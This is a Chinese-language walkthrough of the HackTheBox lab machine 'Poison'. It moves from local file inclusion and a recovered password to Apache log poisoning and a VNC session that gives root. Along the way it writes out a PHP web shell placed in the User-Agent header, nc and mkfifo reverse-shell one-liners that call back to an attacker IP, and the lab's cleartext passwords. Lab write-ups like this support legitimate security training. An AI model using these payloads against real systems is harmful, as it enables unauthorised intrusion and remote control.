# posion

**posion是hackthebox上难度中等的一台靶机**



- namp扫描端口
- 先扫描有哪些个端口是开放的，在查看开放了哪些服务

![image-20211110224501127](http://cdn.mxrblog.cn/image-20211110224501127.png)

![image-20211110224441664](http://cdn.mxrblog.cn/image-20211110224441664.png)

- 收集到的信息

```
22  ssh
80  http
OpenSSH 7.2
Apache 2.4.29
PHP 5.6.32

```

- 登录网站界面

![image-20211111100453932](http://cdn.mxrblog.cn/image-20211111100453932.png)

- 可能具有本地包含漏洞，注意检查这几个php页面的内容，在listfiles.php发现了有意思的漏洞

![image-20211111101648715](http://cdn.mxrblog.cn/image-20211111101648715.png)

- 我们试着打开这个目录文件，里面说这是一段被编码了13次的代码，我们要做的显然就是将这段代码解码13次，还原它

![image-20211111101833300](http://cdn.mxrblog.cn/image-20211111101833300.png)

- 解码所使用到的shell脚本

```
data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```

- 得到密码

```
Charix!2#4%6&8(0
```

![image-20211111105551951](http://cdn.mxrblog.cn/image-20211111105551951.png)

- 查看网站是否有文件包含漏洞
- 然后我们发现了用户名为Charix的用户

![image-20211111104344440](http://cdn.mxrblog.cn/image-20211111104344440.png)

- 使用ssh登录成功



#### 第二种方式

- 使用日志中毒获取shell

- **(日志中毒)[https://www.hackingarticles.in/apache-log-poisoning-through-lfi/]**
  - 日志中毒背后的想法是将一些 php 放入日志中，然后将它们加载到 php 将执行的位置。如果我们查看访问日志，我们会看到每次访问该站点时，都会有一个条目，其中包含所访问的 url 和浏览器访问的用户代理字符串。
  - 最简单的情况是更改我们的用户代理字符串，使其包含 php，然后将该日志文件包含在我们的 LFI 中。我们也可以毒化 url 字段，但访问类似`http://10.10.10.84/browse.php?not_an_arg=[php code]`. 只要我们能把我们的php写入日志，我们就成功了。
- 当我们输错内容时，会显示

![image-20211111114119196](http://cdn.mxrblog.cn/image-20211111114119196.png)

- 通过上述信息，寻找到配置文件/usr/local/etc/apache24/httpd.conf，并从配置文件中找到相对应的日志文件
- 可以使用Ctrl+F搜索CustomLog和ErrorLog

![image-20211111114403791](http://cdn.mxrblog.cn/image-20211111114403791.png)



```
ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log" combined
```

- 打开burpsuit，获取日志文件页面页面并对其修改
- 由于用户代理(User-Agent)这一部分是由我们用户决定的，所以我们可以将这一部分换成我们的漏洞代码

```
<?php system($_GET['c']); ?>
```

![image-20211111211640014](http://cdn.mxrblog.cn/image-20211111211640014.png)

![image-20211111212005822](http://cdn.mxrblog.cn/image-20211111212005822.png)

- 通过修改参数c的值，我们可以在网页得到不同的结果

![image-20211111212233416](http://cdn.mxrblog.cn/image-20211111212233416.png)

- 于是将反弹shell传值给c，第一次使用代码`nc -e /bin/bash 10.10.14.27 4444` ,结果只是连接上了靶机，但是未能反弹shell，这就说明了靶机的nc版本不支持-e 参数，于是使用nc的另一种反弹shell方式，代码：

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

- 进行url编码后传参给c参数

```
view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.14.27%204444%20%3E/tmp/f
```

- 结果

![image-20211111213554036](http://cdn.mxrblog.cn/image-20211111213554036.png)

- 靶机上

![image-20211111213627543](http://cdn.mxrblog.cn/image-20211111213627543.png)





- 无论如何，我们都得到了shell

![image-20211111124342759](http://cdn.mxrblog.cn/image-20211111124342759.png)

- 可以看到有一个压缩的文件，在靶机上无法进行解密，我们将它上传到kali中进行解压在传回原来的机器，解压时密码为用户的charix的密码
- 但是解压后的文件是被加密的，可能又是一种密码

![image-20211111222807663](http://cdn.mxrblog.cn/image-20211111222807663.png)

- 由于靶机的系统是FreeBSD，无法使用LinEnum枚举脚本，于是进行手动枚举

- 枚举进程

`ps -aux | grep root`

![image-20211111223205945](http://cdn.mxrblog.cn/image-20211111223205945.png)

- 有个root用户正在运行的进程，VNC，该进程是是进行远程访问的，查看详细过程

```
ps -auwwx | grep vnc
```

![image-20211111223935417](http://cdn.mxrblog.cn/image-20211111223935417.png)



- 使用netstat进行验证,可以发现确实有vnc的活动端口

![image-20211111224747990](http://cdn.mxrblog.cn/image-20211111224747990.png)

- 由于vnc是图形化界面，无法在终端下对靶机进行直接操作，需要进行端口转发
- 在kali上操作

```
# ssh -L [local-port]:[remote-ip]:[remote-port]
ssh -L 4445:10.10.14.27:5901 charix@10.10.10.84
```

- 使用netstat查看是否成功转发

![image-20211111231917812](http://cdn.mxrblog.cn/image-20211111231917812.png)



- 既然设置了端口转发，让我们连接到攻击机上的 VNC

- 需要密码，密码就是我们解压得到的那个secret文件

  - 解码 VNC 密码

    文件中的 VNC 密码是经过混淆存储的，但它们可以被破解。有一堆脚本可以返回纯文本。我们将使用[这个](https://github.com/trinitronx/vncpasswd.py)，运行 python 并`-d`用于解密，并将`-f secret`其指向我们的文件。

    ```
    root@kali:~/hackthebox/poison-10.10.10.84# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
    Cannot read from Windows Registry on a Linux system
    Cannot write to Windows Registry on a Linux system
    Decrypted Bin Pass= 'VNCP@$$!'
    Decrypted Hex Pass= '564e435040242421'
    ```

```
vncviewer 127.0.0.1:4445 -passwd secret
```

![image-20211111232459425](http://cdn.mxrblog.cn/image-20211111232459425.png)

- 得到root shell

![image-20211111232722013](http://cdn.mxrblog.cn/image-20211111232722013.png)

